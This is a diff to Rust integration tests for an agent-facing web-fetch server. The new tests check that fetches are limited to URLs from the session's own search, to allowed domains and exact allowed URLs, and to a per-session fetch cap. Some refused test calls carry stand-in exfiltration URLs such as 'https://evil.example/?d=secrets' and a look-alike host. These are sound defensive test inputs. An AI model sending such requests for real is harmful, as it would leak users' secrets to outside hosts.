@@ -126,7 +126,7 @@ fn both_handshakes_and_the_tool_list() {
 #[test]
 fn fetch_page_returns_structured_markdown_in_pages() {
     let base = serve(vec![("/lighthouses", "text/html; charset=utf-8", ARTICLE.into())]);
-    let mut s = Server::start(&["--allow-private"]);
+    let mut s = Server::start(&["--allow-private", "--allow-domain", "127.0.0.1"]);
     let url = format!("{base}/lighthouses");
     let r = s.call(1, "fetch_page", json!({"url": url}));
     assert_eq!(r["isError"], false, "{r}");
@@ -162,7 +162,8 @@ fn fetch_page_returns_structured_markdown_in_pages() {
 #[test]
 fn the_guard_and_bad_input_are_tool_errors_the_agent_can_read() {
     let base = serve(vec![("/lighthouses", "text/html", ARTICLE.into())]);
-    let mut s = Server::start(&[]);   // guarded: the operator did not pass --allow-private
+    // guarded: the operator did not pass --allow-private (the domain is allowed, so the guard is what refuses)
+    let mut s = Server::start(&["--allow-domain", "127.0.0.1"]);
     let r = s.call(1, "fetch_page", json!({"url": format!("{base}/lighthouses")}));
     assert_eq!(r["isError"], true);
     assert!(r["content"][0]["text"].as_str().unwrap().contains("private address"), "{r}");
@@ -197,7 +198,7 @@ fn search_returns_structured_results() {
 fn parallel_calls_run_in_parallel() {
     let slow = "<html><head><title>Slow</title></head><body><p>Slow page.</p></body></html>";
     let base = serve(vec![("/slow", "text/html", slow.into())]);
-    let mut s = Server::start(&["--allow-private"]);
+    let mut s = Server::start(&["--allow-private", "--allow-domain", "127.0.0.1"]);
     let t = Instant::now();
     for id in 1..=3 {
         s.send(json!({"jsonrpc": "2.0", "id": id, "method": "tools/call",
@@ -208,4 +209,70 @@ fn parallel_calls_run_in_parallel() {
     assert_eq!(ids, [1, 2, 3]);
     // three 700 ms pages: about 0.7 s together, 2.1 s or more one after another
     assert!(t.elapsed() < Duration::from_millis(1600), "took {:?}", t.elapsed());
+}
+
+#[test]
+fn fetch_page_refuses_an_unseen_url() {
+    let keepers = "<html><head><title>Keepers</title></head><body><article><p>The keepers of the lights.</p></article></body></html>";
+    let pages = serve(vec![("/lighthouses", "text/html", ARTICLE.into()), ("/keepers", "text/html", keepers.into())]);
+    let port = pages.rsplit(':').next().unwrap().to_string();
+    let hits = format!(r#"{{"results":[{{"title":"Lighthouses","url":"{pages}/lighthouses","content":"Towers of light."}}]}}"#);
+    let searx = serve(vec![("/search", "application/json", hits)]);
+    let mut s = Server::start(&["--allow-private", "--searx", &searx, "--allow-domain", "localhost"]);
+    let refused = |r: &Value| {
+        assert_eq!(r["isError"], true, "{r}");
+        let t = r["content"][0]["text"].as_str().unwrap();
+        assert!(t.contains("not returned by this session's search") && t.contains("--allow-domain"), "{t}");
+    };
+
+    // an unseen URL is refused, before anything is fetched
+    refused(&s.call(1, "fetch_page", json!({"url": format!("{pages}/lighthouses")})));
+    refused(&s.call(2, "fetch_page", json!({"url": "https://evil.example/?d=secrets"})));
+
+    // once this session's search returns it, it is fetched (a fragment is never sent, so it is ignored)
+    let r = s.call(3, "search", json!({"query": "lighthouses"}));
+    assert_eq!(r["isError"], false, "{r}");
+    let r = s.call(4, "fetch_page", json!({"url": format!("{pages}/lighthouses")}));
+    assert_eq!(r["isError"], false, "{r}");
+    let content = r["structuredContent"]["content"].as_str().unwrap().to_string();
+    assert!(content.contains(&format!("{pages}/keepers")), "{content}");
+    assert_eq!(s.call(5, "fetch_page", json!({"url": format!("{pages}/lighthouses#history")}))["isError"], false);
+
+    // the query string must match exactly: a seen URL does not license data appended to it
+    refused(&s.call(6, "fetch_page", json!({"url": format!("{pages}/lighthouses?d=secrets")})));
+
+    // a link found only inside the fetched page is refused
+    refused(&s.call(7, "fetch_page", json!({"url": format!("{pages}/keepers")})));
+
+    // an allowed domain passes (the host itself), and only at a dot boundary
+    let r = s.call(8, "fetch_page", json!({"url": format!("http://localhost:{port}/keepers")}));
+    assert_eq!(r["isError"], false, "{r}");
+    assert_eq!(r["structuredContent"]["title"], "Keepers");
+    refused(&s.call(9, "fetch_page", json!({"url": format!("http://evillocalhost:{port}/keepers")})));
+
+    // an --allow-url is matched exactly
+    let mut u = Server::start(&["--allow-private", "--allow-url", &format!("{pages}/keepers")]);
+    assert_eq!(u.call(1, "fetch_page", json!({"url": format!("{pages}/keepers")}))["isError"], false);
+    refused(&u.call(2, "fetch_page", json!({"url": format!("{pages}/keepers?x=1")})));
+
+    // the fetch cap holds: two fetches, then the limit; refused URLs do not count toward it
+    let mut c = Server::start(&["--allow-private", "--allow-domain", "localhost", "--max-fetches", "2"]);
+    refused(&c.call(1, "fetch_page", json!({"url": format!("{pages}/keepers")})));
+    for id in 2..=3 {
+        let r = c.call(id, "fetch_page", json!({"url": format!("http://localhost:{port}/keepers")}));
+        assert_eq!(r["isError"], false, "{r}");
+    }
+    let r = c.call(4, "fetch_page", json!({"url": format!("http://localhost:{port}/keepers")}));
+    assert_eq!(r["isError"], true, "{r}");
+    assert!(r["content"][0]["text"].as_str().unwrap().contains("fetch limit reached (2 per session; --max-fetches)"), "{r}");
+}
+
+#[test]
+fn the_gate_flags_need_mcp() {
+    let out = Command::new(env!("CARGO_BIN_EXE_webfetch"))
+        .args(["https://example.com/", "--allow-domain", "example.com"])
+        .output()
+        .unwrap();
+    assert!(!out.status.success());
+    assert!(String::from_utf8_lossy(&out.stderr).contains("--mcp"));
 }
